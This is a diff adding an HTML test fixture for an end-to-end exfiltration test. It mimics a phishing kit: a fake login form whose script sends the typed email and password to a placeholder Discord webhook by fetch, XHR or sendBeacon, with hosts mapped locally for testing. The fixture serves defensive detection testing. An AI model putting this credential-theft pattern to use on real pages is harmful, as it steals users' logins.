@@ -1,0 +1,40 @@
+<!doctype html><html lang="en"><meta charset="utf-8"><title>Sign in</title>
+<!-- Fixture for tests/e2e/exfil.spec.js: a phishing-kit shape. The form posts nowhere (javascript:void(0));
+     a click handler sends the typed login to a Discord webhook (the Discord twin of exfil-kit.html, so the static scan names Discord). api.telegram.org and discord.com are
+     host-mapped to the local fixture server (tools/lib/ext-launch.js), so nothing leaves the machine.
+     ?via=fetch|xhr|beacon  ?send=login|nosecret -->
+<main style="padding-top:260px"><h1>Secure account login</h1>
+<form id="f" action="javascript:void(0);">
+  <input type="email" id="email" name="email" placeholder="email">
+  <input type="password" id="pw" name="pw" placeholder="password">
+  <button type="button" id="go">Log in</button>
+</form>
+<p id="out">idle</p></main>
+<script>
+  var q = new URLSearchParams(location.search);
+  var via = q.get('via') || 'fetch', svc = 'discord', mode = q.get('send') || 'login';
+  var URLS = {
+    discord: 'https://discord.com/api/webhooks/1234567890123/fixtureWebhookToken_0123456789abcdefghij'
+  };
+  function done(s) { document.getElementById('out').textContent = s; }
+  document.getElementById('go').addEventListener('click', function () {
+    var email = document.getElementById('email').value, pw = document.getElementById('pw').value;
+    var text = mode === 'nosecret' ? 'visitor opened the login page' : 'email: ' + email + '\npassword: ' + pw;
+    var url = URLS[svc];
+    if (via === 'xhr') {
+      // what jQuery $.ajax does
+      var x = new XMLHttpRequest();
+      x.open('POST', url, true);
+      x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      x.onloadend = function () { done(x.readyState === 4 && x.status === 0 ? 'failed' : 'sent'); };
+      x.onerror = function () { window.__xhrError = true; };
+      x.send(new URLSearchParams({ chat_id: '-1001234567890', text: text }).toString());
+    } else if (via === 'beacon') {
+      var ok = navigator.sendBeacon(url, new URLSearchParams({ chat_id: '-1001234567890', text: text }));
+      done(ok ? 'sent' : 'failed');
+    } else {
+      fetch(url, { method: 'POST', mode: 'no-cors', body: new URLSearchParams({ chat_id: '-1001234567890', text: text }) })
+        .then(function () { done('sent'); }, function () { done('failed'); });
+    }
+  });
+</script></html>
